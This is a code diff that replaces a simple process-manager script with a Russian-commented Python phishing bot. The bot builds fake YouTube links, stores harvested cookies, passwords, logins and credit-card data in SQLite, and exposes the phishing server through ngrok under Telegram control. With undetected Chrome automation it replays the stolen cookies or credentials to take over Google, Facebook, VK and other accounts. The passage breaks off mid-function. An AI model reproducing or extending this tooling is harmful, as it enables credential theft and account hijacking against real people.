@@ -1,338 +1,3082 @@
-import os
-import sys
-import time
-import json
-import signal
-import subprocess
-import threading
-from pathlib import Path
-from datetime import datetime
+#!/usr/bin/env python3
+"""
+YouTube Phishing Bot - ПОЛНЫЙ КОМПЛЕКС
+Создает фишинг ссылки на YouTube, собирает ВСЕ данные, автоматически входит в аккаунты
+"""
 
-class BotManager:
+import logging
+import asyncio
+import json
+import re
+import uuid
+import os
+import time
+import sys
+import sqlite3
+import random
+import string
+from datetime import datetime
+from typing import Dict, List, Optional, Any
+import threading
+import subprocess
+from urllib.parse import urlparse, parse_qs, quote, unquote
+import html
+import base64
+import undetected_chromedriver as uc
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.chrome.options import Options
+from selenium.common.exceptions import TimeoutException, WebDriverException
+
+# Flask и веб
+from flask import Flask, request, jsonify, render_template_string, make_response, redirect, send_file
+from flask_cors import CORS
+import requests
+from werkzeug.middleware.proxy_fix import ProxyFix
+
+# Telegram
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    filters,
+    ContextTypes,
+    CallbackQueryHandler
+)
+from telegram.constants import ParseMode
+
+# ========== НАСТРОЙКИ ==========
+BOT_TOKEN = "ВАШ_ТОКЕН_БОТА_TELEGRAM"
+ADMIN_ID = 1709490182  # Ваш ID в Telegram
+NGROK_AUTH_TOKEN = "ВАШ_ТОКЕН_NGROK"
+FLASK_PORT = 8080
+
+# Настройки для автоматического входа
+AUTO_LOGIN_CONFIG = {
+    "device_name": "iPhone 13 Pro iOS 17",
+    "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "screen_size": {"width": 390, "height": 844},
+    "language": "ru-RU",
+    "timezone": "Europe/Moscow",
+    "location": {
+        "ip": "31.43.37.220",
+        "city": "Lubny",
+        "country": "Ukraine"
+    }
+}
+
+# Настройка логирования
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO,
+    handlers=[
+        logging.FileHandler('youtube_phishing.log', encoding='utf-8'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
+# ========== БАЗА ДАННЫХ ==========
+class Database:
     def __init__(self):
-        # Указываем ТОЧНОЕ имя вашего файла
-        self.bot_script = "code3.py"  # ⬅️ ВАЖНО: ваше имя файла
-        self.bot_dir = Path.cwd()  # Текущая директория
-        self.data_dir = self.bot_dir / ".bot_data"
-        self.data_dir.mkdir(exist_ok=True)
+        self.conn = sqlite3.connect('youtube_phishing.db', check_same_thread=False)
+        self.create_tables()
+    
+    def create_tables(self):
+        cursor = self.conn.cursor()
         
-        # Файлы для управления
-        self.pid_file = self.data_dir / "code3.pid"
-        self.log_file = self.data_dir / "code3.log"
-        self.status_file = self.data_dir / "code3.status"
+        # Таблица фишинг ссылок
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS phishing_links (
+                id TEXT PRIMARY KEY,
+                youtube_url TEXT,
+                youtube_id TEXT,
+                phishing_url TEXT,
+                created_at TEXT,
+                created_by INTEGER,
+                clicks INTEGER DEFAULT 0,
+                is_active INTEGER DEFAULT 1,
+                title TEXT,
+                description TEXT
+            )
+        ''')
         
-        print(f"📁 Рабочая директория: {self.bot_dir}")
-        print(f"🤖 Целевой скрипт: {self.bot_script}")
+        # Таблица собранных данных
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS captured_data (
+                id TEXT PRIMARY KEY,
+                link_id TEXT,
+                timestamp TEXT,
+                ip_address TEXT,
+                user_agent TEXT,
+                cookies TEXT,
+                localStorage TEXT,
+                sessionStorage TEXT,
+                passwords TEXT,
+                logins TEXT,
+                credit_cards TEXT,
+                autofill_data TEXT,
+                browser_info TEXT,
+                device_info TEXT,
+                network_info TEXT,
+                sensitive_data TEXT,
+                identified_services TEXT,
+                FOREIGN KEY (link_id) REFERENCES phishing_links (id)
+            )
+        ''')
         
-    def check_script_exists(self):
-        """Проверяем, существует ли code3.py"""
-        script_path = self.bot_dir / self.bot_script
-        if not script_path.exists():
-            print(f"❌ Ошибка: файл {self.bot_script} не найден!")
-            print(f"   Ищем в: {script_path}")
-            print(f"   Текущие файлы в директории:")
-            for f in self.bot_dir.iterdir():
-                print(f"    - {f.name}")
-            return False
+        # Таблица учетных данных для автовхода
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS auto_login_data (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                data_id TEXT,
+                service TEXT,
+                email TEXT,
+                password TEXT,
+                cookies TEXT,
+                tokens TEXT,
+                login_result TEXT,
+                screenshot_path TEXT,
+                timestamp TEXT,
+                FOREIGN KEY (data_id) REFERENCES captured_data (id)
+            )
+        ''')
+        
+        # Таблица результатов автовхода
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS auto_login_results (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                data_id TEXT,
+                service TEXT,
+                success INTEGER,
+                message TEXT,
+                account_info TEXT,
+                screenshot_path TEXT,
+                timestamp TEXT
+            )
+        ''')
+        
+        # Статистика
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS stats (
+                key TEXT PRIMARY KEY,
+                value INTEGER
+            )
+        ''')
+        
+        # Инициализация
+        default_stats = [
+            ('total_links', 0),
+            ('total_clicks', 0),
+            ('total_captured', 0),
+            ('total_credentials', 0),
+            ('total_cookies', 0),
+            ('auto_login_attempts', 0),
+            ('auto_login_success', 0),
+            ('google_accounts', 0),
+            ('facebook_accounts', 0),
+            ('instagram_accounts', 0),
+            ('twitter_accounts', 0),
+            ('vk_accounts', 0)
+        ]
+        
+        cursor.executemany(
+            'INSERT OR IGNORE INTO stats (key, value) VALUES (?, ?)',
+            default_stats
+        )
+        
+        self.conn.commit()
+    
+    # Методы для фишинг ссылок
+    def add_phishing_link(self, link_data):
+        cursor = self.conn.cursor()
+        
+        cursor.execute('''
+            INSERT INTO phishing_links 
+            (id, youtube_url, youtube_id, phishing_url, created_at, created_by, title, description)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            link_data['id'],
+            link_data['youtube_url'],
+            link_data['youtube_id'],
+            link_data['phishing_url'],
+            link_data['created_at'],
+            link_data['created_by'],
+            link_data.get('title', ''),
+            link_data.get('description', '')
+        ))
+        
+        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_links"')
+        self.conn.commit()
         return True
     
-    def start(self):
-        """Запуск code3.py в фоновом режиме"""
-        if not self.check_script_exists():
-            return False
+    def increment_clicks(self, link_id):
+        cursor = self.conn.cursor()
+        cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
+        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_clicks"')
+        self.conn.commit()
+    
+    def get_link(self, link_id):
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM phishing_links WHERE id = ?', (link_id,))
+        row = cursor.fetchone()
+        
+        if not row:
+            return None
+        
+        columns = [desc[0] for desc in cursor.description]
+        return dict(zip(columns, row))
+    
+    def get_user_links(self, user_id):
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM phishing_links WHERE created_by = ? ORDER BY created_at DESC', (user_id,))
+        
+        columns = [desc[0] for desc in cursor.description]
+        return [dict(zip(columns, row)) for row in cursor.fetchall()]
+    
+    # Методы для собранных данных
+    def add_captured_data(self, data):
+        cursor = self.conn.cursor()
+        
+        cursor.execute('''
+            INSERT INTO captured_data 
+            (id, link_id, timestamp, ip_address, user_agent, cookies, localStorage, 
+             sessionStorage, passwords, logins, credit_cards, autofill_data, 
+             browser_info, device_info, network_info, sensitive_data, identified_services)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            data['id'],
+            data['link_id'],
+            data['timestamp'],
+            data.get('ip_address'),
+            data.get('user_agent'),
+            json.dumps(data.get('cookies', []), ensure_ascii=False),
+            json.dumps(data.get('localStorage', {}), ensure_ascii=False),
+            json.dumps(data.get('sessionStorage', {}), ensure_ascii=False),
+            json.dumps(data.get('passwords', []), ensure_ascii=False),
+            json.dumps(data.get('logins', []), ensure_ascii=False),
+            json.dumps(data.get('credit_cards', []), ensure_ascii=False),
+            json.dumps(data.get('autofill_data', {}), ensure_ascii=False),
+            json.dumps(data.get('browser_info', {}), ensure_ascii=False),
+            json.dumps(data.get('device_info', {}), ensure_ascii=False),
+            json.dumps(data.get('network_info', {}), ensure_ascii=False),
+            json.dumps(data.get('sensitive_data', {}), ensure_ascii=False),
+            json.dumps(data.get('identified_services', []), ensure_ascii=False)
+        ))
+        
+        # Обновляем статистику
+        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_captured"')
+        
+        credentials_count = len(data.get('passwords', [])) + len(data.get('logins', []))
+        if credentials_count > 0:
+            cursor.execute('UPDATE stats SET value = value + ? WHERE key = "total_credentials"', (credentials_count,))
+        
+        cookies_count = len(data.get('cookies', []))
+        if cookies_count > 0:
+            cursor.execute('UPDATE stats SET value = value + ? WHERE key = "total_cookies"', (cookies_count,))
+        
+        self.conn.commit()
+        return True
+    
+    def get_captured_data(self, data_id):
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM captured_data WHERE id = ?', (data_id,))
+        row = cursor.fetchone()
+        
+        if not row:
+            return None
+        
+        columns = [desc[0] for desc in cursor.description]
+        data = dict(zip(columns, row))
+        
+        # Парсим JSON поля
+        json_fields = ['cookies', 'localStorage', 'sessionStorage', 'passwords', 'logins',
+                      'credit_cards', 'autofill_data', 'browser_info', 'device_info',
+                      'network_info', 'sensitive_data', 'identified_services']
+        
+        for field in json_fields:
+            if data.get(field):
+                try:
+                    data[field] = json.loads(data[field])
+                except:
+                    data[field] = []
+        
+        return data
+    
+    def get_data_by_link(self, link_id):
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM captured_data WHERE link_id = ? ORDER BY timestamp DESC', (link_id,))
+        
+        columns = [desc[0] for desc in cursor.description]
+        results = []
+        
+        for row in cursor.fetchall():
+            data = dict(zip(columns, row))
             
-        if self.is_running():
-            pid = self.get_pid()
-            print(f"⚠️ code3.py уже запущен! PID: {pid}")
-            print(f"   Для остановки: python3 manager.py stop")
-            return False
+            # Парсим JSON поля
+            json_fields = ['cookies', 'passwords', 'logins', 'identified_services']
+            for field in json_fields:
+                if data.get(field):
+                    try:
+                        data[field] = json.loads(data[field])
+                    except:
+                        data[field] = []
+            
+            results.append(data)
         
-        # Полный путь к скрипту
-        script_path = self.bot_dir / self.bot_script
+        return results
+    
+    # Методы для автовхода
+    def add_auto_login_result(self, result_data):
+        cursor = self.conn.cursor()
         
-        # Открываем лог-файл
-        log_fd = open(self.log_file, 'a')
-        log_fd.write(f"\n{'='*60}\n")
-        log_fd.write(f"Запуск code3.py: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        log_fd.write(f"Директория: {self.bot_dir}\n")
-        log_fd.flush()
+        cursor.execute('''
+            INSERT INTO auto_login_results 
+            (data_id, service, success, message, account_info, screenshot_path, timestamp)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            result_data['data_id'],
+            result_data['service'],
+            result_data['success'],
+            result_data['message'],
+            json.dumps(result_data.get('account_info', {}), ensure_ascii=False),
+            result_data.get('screenshot_path'),
+            result_data['timestamp']
+        ))
         
+        # Обновляем статистику
+        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "auto_login_attempts"')
+        if result_data['success']:
+            cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "auto_login_success"')
+        
+        # Обновляем статистику по сервисам
+        if result_data['success']:
+            cursor.execute(
+                'UPDATE stats SET value = value + 1 WHERE key = ?',
+                (f"{result_data['service']}_accounts",)
+            )
+        
+        self.conn.commit()
+        return True
+    
+    def get_auto_login_results(self, data_id=None):
+        cursor = self.conn.cursor()
+        
+        if data_id:
+            cursor.execute('SELECT * FROM auto_login_results WHERE data_id = ? ORDER BY timestamp DESC', (data_id,))
+        else:
+            cursor.execute('SELECT * FROM auto_login_results ORDER BY timestamp DESC LIMIT 50')
+        
+        columns = [desc[0] for desc in cursor.description]
+        results = []
+        
+        for row in cursor.fetchall():
+            data = dict(zip(columns, row))
+            if data.get('account_info'):
+                try:
+                    data['account_info'] = json.loads(data['account_info'])
+                except:
+                    data['account_info'] = {}
+            results.append(data)
+        
+        return results
+    
+    # Статистика
+    def get_stats(self):
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT key, value FROM stats')
+        rows = cursor.fetchall()
+        return {row[0]: row[1] for row in rows}
+    
+    def get_service_stats(self):
+        cursor = self.conn.cursor()
+        cursor.execute('''
+            SELECT service, COUNT(*) as count, 
+                   SUM(CASE WHEN success = 1 THEN 1 ELSE 0 END) as success_count
+            FROM auto_login_results 
+            GROUP BY service
+        ''')
+        
+        stats = {}
+        for row in cursor.fetchall():
+            stats[row[0]] = {
+                'total': row[1],
+                'success': row[2],
+                'success_rate': round((row[2] / row[1]) * 100, 1) if row[1] > 0 else 0
+            }
+        
+        return stats
+
+# Инициализация базы
+db = Database()
+
+# ========== NGROK МЕНЕДЖЕР ==========
+class NgrokManager:
+    def __init__(self, auth_token):
+        self.auth_token = auth_token
+        self.public_url = None
+        self.process = None
+    
+    def start(self, port=8080):
+        """Запускает ngrok туннель"""
         try:
-            # Запускаем процесс
-            print(f"🚀 Запускаем {self.bot_script}...")
-            process = subprocess.Popen(
-                [sys.executable, str(script_path)],
-                stdout=log_fd,
-                stderr=subprocess.STDOUT,
-                stdin=subprocess.DEVNULL,
-                start_new_session=True,
-                cwd=self.bot_dir  # Важно: запускаем из правильной директории
+            # Устанавливаем auth token
+            subprocess.run(['ngrok', 'authtoken', self.auth_token], 
+                         capture_output=True, timeout=5)
+            
+            # Запускаем ngrok
+            self.process = subprocess.Popen(
+                ['ngrok', 'http', str(port), '--log=stdout'],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                universal_newlines=True,
+                bufsize=1
             )
             
-            # Сохраняем PID
-            with open(self.pid_file, 'w') as f:
-                f.write(str(process.pid))
+            # Ждем запуска
+            time.sleep(3)
+            self.public_url = self.get_public_url()
             
-            # Сохраняем статус
-            self.save_status({
-                'pid': process.pid,
-                'start_time': datetime.now().isoformat(),
-                'script': str(self.bot_script),
-                'status': 'running',
-                'directory': str(self.bot_dir)
-            })
+            if self.public_url:
+                logger.info(f"Ngrok started! Public URL: {self.public_url}")
+                
+                # Запускаем поток для чтения логов
+                threading.Thread(target=self.read_output, daemon=True).start()
+                
+                return self.public_url
             
-            # Мониторинг в отдельном потоке
-            monitor_thread = threading.Thread(
-                target=self.monitor_process,
-                args=(process.pid,),
-                daemon=True
-            )
-            monitor_thread.start()
-            
-            print(f"✅ {self.bot_script} запущен!")
-            print(f"   PID: {process.pid}")
-            print(f"   Логи: tail -f {self.log_file}")
-            print(f"   Для остановки: python3 manager.py stop")
-            print(f"   Для проверки: python3 manager.py status")
-            
-            return True
+            return None
             
         except Exception as e:
-            print(f"❌ Ошибка запуска {self.bot_script}:")
-            print(f"   {e}")
-            return False
-    
-    def stop(self):
-        """Остановка code3.py"""
-        pid = self.get_pid()
-        if not pid:
-            print("⚠️ code3.py не запущен")
-            return False
-        
-        try:
-            print(f"🛑 Останавливаем code3.py (PID: {pid})...")
-            
-            # Сначала мягко
-            os.kill(pid, signal.SIGTERM)
-            time.sleep(2)
-            
-            # Если жив, убиваем
-            if self.is_pid_running(pid):
-                print(f"   Процесс не отвечает, принудительная остановка...")
-                os.kill(pid, signal.SIGKILL)
-                time.sleep(1)
-            
-            # Очищаем
-            if self.pid_file.exists():
-                self.pid_file.unlink()
-            
-            self.save_status({
-                'status': 'stopped', 
-                'stop_time': datetime.now().isoformat(),
-                'last_pid': pid
-            })
-            
-            print(f"✅ code3.py остановлен")
-            return True
-            
-        except ProcessLookupError:
-            print(f"⚠️ Процесс {pid} не найден (возможно уже завершился)")
-            self.pid_file.unlink(missing_ok=True)
-            return True
-        except Exception as e:
-            print(f"❌ Ошибка остановки: {e}")
-            return False
-    
-    def monitor_process(self, pid):
-        """Мониторинг процесса"""
-        while True:
-            time.sleep(15)  # Проверяем каждые 15 секунд
-            if not self.is_pid_running(pid):
-                with open(self.log_file, 'a') as f:
-                    f.write(f"\n[Менеджер] Процесс {pid} завершился: {datetime.now()}\n")
-                
-                if self.pid_file.exists():
-                    self.pid_file.unlink()
-                
-                self.save_status({
-                    'status': 'crashed',
-                    'last_seen': datetime.now().isoformat(),
-                    'last_pid': pid
-                })
-                break
-    
-    def is_pid_running(self, pid):
-        """Проверка, работает ли процесс"""
-        try:
-            os.kill(pid, 0)
-            return True
-        except (ProcessLookupError, PermissionError):
-            return False
-    
-    def is_running(self):
-        """Проверка, запущен ли code3.py"""
-        pid = self.get_pid()
-        return pid and self.is_pid_running(pid)
-    
-    def get_pid(self):
-        """Получение PID"""
-        try:
-            with open(self.pid_file, 'r') as f:
-                return int(f.read().strip())
-        except (FileNotFoundError, ValueError):
+            logger.error(f"Error starting ngrok: {e}")
             return None
     
-    def save_status(self, status_data):
-        """Сохранение статуса"""
+    def get_public_url(self):
+        """Получает публичный URL от ngrok"""
         try:
-            with open(self.status_file, 'w') as f:
-                json.dump(status_data, f, indent=2, default=str)
-        except Exception as e:
-            print(f"Ошибка сохранения статуса: {e}")
-    
-    def get_status(self):
-        """Получение статуса"""
-        try:
-            with open(self.status_file, 'r') as f:
-                return json.load(f)
-        except (FileNotFoundError, json.JSONDecodeError):
-            return {'status': 'unknown'}
-    
-    def show_logs(self, lines=20):
-        """Показать логи"""
-        try:
-            with open(self.log_file, 'r') as f:
-                all_lines = f.readlines()
-                if lines > 0:
-                    print(''.join(all_lines[-lines:]))
-                else:
-                    print(''.join(all_lines))
-                    
-                # Показать размер файла
-                print(f"\n📊 Всего строк: {len(all_lines)}")
-                print(f"📁 Размер файла: {os.path.getsize(self.log_file)} байт")
+            time.sleep(2)
+            response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
+            
+            if response.status_code == 200:
+                data = response.json()
+                tunnels = data.get('tunnels', [])
                 
-        except FileNotFoundError:
-            print("Лог-файл не найден. Бот еще не запускался?")
+                if tunnels:
+                    return tunnels[0].get('public_url')
+            
+            return None
+            
+        except:
+            return None
     
-    def clear_logs(self):
-        """Очистить логи"""
-        try:
-            with open(self.log_file, 'w') as f:
-                f.write(f"Логи очищены: {datetime.now()}\n")
-            print("✅ Логи очищены")
-        except Exception as e:
-            print(f"❌ Ошибка очистки логов: {e}")
-    
-    def status(self):
-        """Показать статус"""
-        pid = self.get_pid()
-        
-        print(f"\n📊 СТАТУС code3.py")
-        print(f"{'='*40}")
-        
-        # Проверяем существование скрипта
-        script_path = self.bot_dir / self.bot_script
-        if script_path.exists():
-            size = os.path.getsize(script_path)
-            print(f"📁 Скрипт: {self.bot_script} ({size} байт)")
-        else:
-            print(f"❌ Скрипт: {self.bot_script} - НЕ НАЙДЕН!")
+    def read_output(self):
+        """Читает вывод ngrok"""
+        if not self.process:
             return
         
-        if self.is_running():
-            status_info = self.get_status()
-            start_time = status_info.get('start_time', 'неизвестно')
-            
-            # Пытаемся вычислить время работы
-            try:
-                if start_time != 'неизвестно':
-                    start_dt = datetime.fromisoformat(start_time)
-                    uptime = datetime.now() - start_dt
-                    days = uptime.days
-                    hours = uptime.seconds // 3600
-                    minutes = (uptime.seconds % 3600) // 60
-                    uptime_str = f"{days}д {hours}ч {minutes}м"
-                else:
-                    uptime_str = "неизвестно"
-            except:
-                uptime_str = "неизвестно"
-            
-            print(f"✅ Статус: ЗАПУЩЕН")
-            print(f"   PID: {pid}")
-            print(f"   Время запуска: {start_time}")
-            print(f"   Время работы: {uptime_str}")
-            print(f"   Логи: {self.log_file}")
-            
-            # Размер логов
-            if self.log_file.exists():
-                log_size = os.path.getsize(self.log_file)
-                print(f"   Размер логов: {log_size} байт")
-            
-        else:
-            last_status = self.get_status()
-            if last_status.get('status') == 'crashed':
-                crash_time = last_status.get('last_seen', 'неизвестно')
-                print(f"💥 Статус: УПАЛ ({crash_time})")
-                print(f"   Последний PID: {last_status.get('last_pid', 'неизвестно')}")
-            else:
-                print(f"❌ Статус: НЕ ЗАПУЩЕН")
-            
-            # Показываем последний PID если был
-            if pid:
-                print(f"   Последний PID: {pid} (процесс не найден)")
-
-def main():
-    import argparse
+        try:
+            for line in iter(self.process.stdout.readline, ''):
+                line = line.strip()
+                if line and 'url=' in line.lower():
+                    match = re.search(r'url=([^\s]+)', line)
+                    if match and not self.public_url:
+                        self.public_url = match.group(1)
+                        logger.info(f"Found ngrok URL from output: {self.public_url}")
+                        
+        except:
+            pass
     
-    parser = argparse.ArgumentParser(
-        description=f'Менеджер для запуска code3.py в фоновом режиме',
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=f'''
-Примеры использования:
-  python3 manager.py start     - Запустить code3.py
-  python3 manager.py stop      - Остановить code3.py
-  python3 manager.py restart   - Перезапустить
-  python3 manager.py status    - Показать статус
-  python3 manager.py logs      - Показать логи (20 строк)
-  python3 manager.py logs -50  - Показать 50 строк логов
-  python3 manager.py logs 0    - Показать все логи
-  python3 manager.py clear     - Очистить логи
-        '''
+    def stop(self):
+        """Останавливает ngrok"""
+        if self.process:
+            try:
+                self.process.terminate()
+                self.process.wait(timeout=5)
+            except:
+                try:
+                    self.process.kill()
+                except:
+                    pass
+            finally:
+                self.process = None
+                self.public_url = None
+
+# ========== МЕНЕДЖЕР АВТОВХОДА ==========
+class AutoLoginManager:
+    def __init__(self):
+        self.driver = None
+        self.results = []
+    
+    def setup_driver(self):
+        """Настраивает ChromeDriver для автоматического входа"""
+        try:
+            chrome_options = Options()
+            
+            # Настройки для обхода обнаружения
+            chrome_options.add_argument(f'--user-agent={AUTO_LOGIN_CONFIG["user_agent"]}')
+            chrome_options.add_argument(f'--window-size={AUTO_LOGIN_CONFIG["screen_size"]["width"]},{AUTO_LOGIN_CONFIG["screen_size"]["height"]}')
+            chrome_options.add_argument('--no-sandbox')
+            chrome_options.add_argument('--disable-dev-shm-usage')
+            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
+            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            chrome_options.add_experimental_option('useAutomationExtension', False)
+            chrome_options.add_argument(f'--lang={AUTO_LOGIN_CONFIG["language"]}')
+            
+            # Прокси если нужно
+            # chrome_options.add_argument(f'--proxy-server={AUTO_LOGIN_CONFIG["location"]["ip"]}')
+            
+            # Запуск в обычном режиме (не headless для отладки)
+            # chrome_options.add_argument('--headless=new')
+            
+            self.driver = uc.Chrome(options=chrome_options)
+            
+            # Скрываем WebDriver
+            self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
+                "userAgent": AUTO_LOGIN_CONFIG["user_agent"],
+                "platform": "iPhone",
+                "acceptLanguage": AUTO_LOGIN_CONFIG["language"]
+            })
+            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+            
+            logger.info("ChromeDriver настроен для автоматического входа")
+            return True
+            
+        except Exception as e:
+            logger.error(f"Error setting up ChromeDriver: {e}")
+            return False
+    
+    def login_with_cookies(self, service, cookies, email=None, password=None):
+        """Автоматический вход через cookies"""
+        try:
+            if not self.driver:
+                if not self.setup_driver():
+                    return {"success": False, "message": "Не удалось настроить браузер"}
+            
+            service_urls = {
+                "google": "https://accounts.google.com",
+                "facebook": "https://facebook.com",
+                "instagram": "https://instagram.com",
+                "twitter": "https://twitter.com",
+                "vk": "https://vk.com",
+                "yandex": "https://passport.yandex.ru",
+                "mailru": "https://mail.ru",
+                "github": "https://github.com",
+                "microsoft": "https://login.live.com"
+            }
+            
+            if service not in service_urls:
+                return {"success": False, "message": f"Сервис {service} не поддерживается"}
+            
+            url = service_urls[service]
+            self.driver.get(url)
+            time.sleep(2)
+            
+            # Очищаем cookies
+            self.driver.delete_all_cookies()
+            
+            # Добавляем новые cookies
+            for cookie in cookies:
+                try:
+                    if isinstance(cookie, dict) and 'name' in cookie and 'value' in cookie:
+                        selenium_cookie = {
+                            'name': cookie['name'],
+                            'value': cookie['value'],
+                            'domain': cookie.get('domain', '.google.com' if service == 'google' else f'.{service}.com'),
+                            'path': cookie.get('path', '/'),
+                            'secure': True if url.startswith('https://') else False
+                        }
+                        self.driver.add_cookie(selenium_cookie)
+                except Exception as e:
+                    logger.error(f"Error adding cookie: {e}")
+            
+            # Обновляем страницу
+            self.driver.refresh()
+            time.sleep(3)
+            
+            # Проверяем успешность входа
+            is_logged_in = self.check_login_status(service)
+            
+            if is_logged_in:
+                # Делаем скриншот
+                screenshot_dir = "screenshots"
+                os.makedirs(screenshot_dir, exist_ok=True)
+                screenshot_path = f"{screenshot_dir}/{service}_{int(time.time())}.png"
+                self.driver.save_screenshot(screenshot_path)
+                
+                # Получаем информацию об аккаунте
+                account_info = self.get_account_info(service)
+                
+                return {
+                    "success": True,
+                    "service": service,
+                    "message": "Успешный вход",
+                    "account_info": account_info,
+                    "screenshot_path": screenshot_path,
+                    "url": self.driver.current_url
+                }
+            else:
+                # Пробуем войти через email/password если есть
+                if email and password:
+                    return self.login_with_credentials(service, email, password)
+                
+                return {
+                    "success": False,
+                    "service": service,
+                    "message": "Не удалось войти через cookies"
+                }
+            
+        except Exception as e:
+            logger.error(f"Error in auto login for {service}: {e}")
+            return {
+                "success": False,
+                "service": service,
+                "message": f"Ошибка: {str(e)[:100]}"
+            }
+    
+    def check_login_status(self, service):
+        """Проверяет статус входа"""
+        try:
+            time.sleep(2)
+            
+            check_selectors = {
+                "google": ['[aria-label*="Аккаунт"]', '[data-identifier*="@"]'],
+                "facebook": ['[aria-label="Ваш профиль"]', '[data-testid="left_nav_item_Profile"]'],
+                "instagram": ['[href*="/accounts/"]', 'img[alt*="profile"]'],
+                "twitter": ['[data-testid="SideNav_AccountSwitcher_Button"]', '[aria-label="Профиль"]'],
+                "vk": ['#top_profile_link', '.top_profile_name'],
+                "yandex": ['.passport-User-Avatar', '.passport-Header-Text']
+            }
+            
+            if service in check_selectors:
+                for selector in check_selectors[service]:
+                    try:
+                        elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
+                        if elements:
+                            return True
+                    except:
+                        continue
+            
+            # Альтернативная проверка по URL
+            current_url = self.driver.current_url
+            logged_in_urls = {
+                "google": ["myaccount.google.com", "mail.google.com"],
+                "facebook": ["facebook.com/home"],
+                "instagram": ["instagram.com/direct/"],
+                "twitter": ["twitter.com/home"],
+                "vk": ["vk.com/feed"],
+                "yandex": ["passport.yandex.ru/profile"]
+            }
+            
+            if service in logged_in_urls:
+                for logged_url in logged_in_urls[service]:
+                    if logged_url in current_url:
+                        return True
+            
+            return False
+            
+        except:
+            return False
+    
+    def get_account_info(self, service):
+        """Получает информацию об аккаунте"""
+        info = {"service": service, "url": self.driver.current_url}
+        
+        try:
+            if service == "google":
+                self.driver.get("https://myaccount.google.com")
+                time.sleep(2)
+                
+                # Пытаемся получить email
+                email_elements = self.driver.find_elements(By.CSS_SELECTOR, '[data-identifier], [data-email]')
+                if email_elements:
+                    info["email"] = email_elements[0].get_attribute("data-identifier") or \
+                                  email_elements[0].get_attribute("data-email") or \
+                                  email_elements[0].text
+            
+            elif service == "facebook":
+                # Переходим в профиль
+                profile_links = self.driver.find_elements(By.CSS_SELECTOR, '[data-testid="left_nav_item_Profile"]')
+                if profile_links:
+                    profile_links[0].click()
+                    time.sleep(2)
+                
+                # Получаем имя
+                name_elements = self.driver.find_elements(By.CSS_SELECTOR, 'h1, .gmql0nx0')
+                if name_elements:
+                    info["name"] = name_elements[0].text
+            
+            elif service == "vk":
+                # Получаем ID из URL
+                if "/id" in self.driver.current_url:
+                    parts = self.driver.current_url.split("/id")
+                    if len(parts) > 1:
+                        info["vk_id"] = parts[1].split("/")[0]
+            
+        except:
+            pass
+        
+        return info
+    
+    def login_with_credentials(self, service, email, password):
+        """Вход через email и пароль"""
+        try:
+            service_urls = {
+                "google": "https://accounts.google.com",
+                "facebook": "https://facebook.com",
+                "vk": "https://vk.com"
+            }
+            
+            if service not in service_urls:
+                return {"success": False, "message": "Сервис не поддерживает вход по паролю"}
+            
+            self.driver.get(service_urls[service])
+            time.sleep(2)
+            
+            # Google
+            if service == "google":
+                # Вводим email
+                email_field = self.driver.find_element(By.CSS_SELECTOR, 'input[type="email"]')
+                email_field.send_keys(email)
+                self.driver.find_element(By.ID, 'identifierNext').click()
+                time.sleep(2)
+                
+                # Вводим пароль
+                password_field = self.driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
+                password_field.send_keys(password)
+                self.driver.find_element(By.ID, 'passwordNext').click()
+                time.sleep(3)
+            
+            # Facebook
+            elif service == "facebook":
+                email_field = self.driver.find_element(By.ID, 'email')
+                password_field = self.driver.find_element(By.ID, 'pass')
+                email_field.send_keys(email)
+                password_field.send_keys(password)
+                self.driver.find_element(By.NAME, 'login').click()
+                time.sleep(3)
+            
+            # VK
+            elif service == "vk":
+                email_field = self.driver.find_element(By.NAME, 'email')
+                password_field = self.driver.find_element(By.NAME, 'pass')
+                email_field.send_keys(email)
+                password_field.send_keys(password)
+                self.driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()
+                time.sleep(3)
+            
+            # Проверяем успешность
+            if self.check_login_status(service):
+                screenshot_path = f"screenshots/{service}_{int(time.time())}.png"
+                self.driver.save_screenshot(screenshot_path)
+                
+                return {
+                    "success": True,
+                    "service": service,
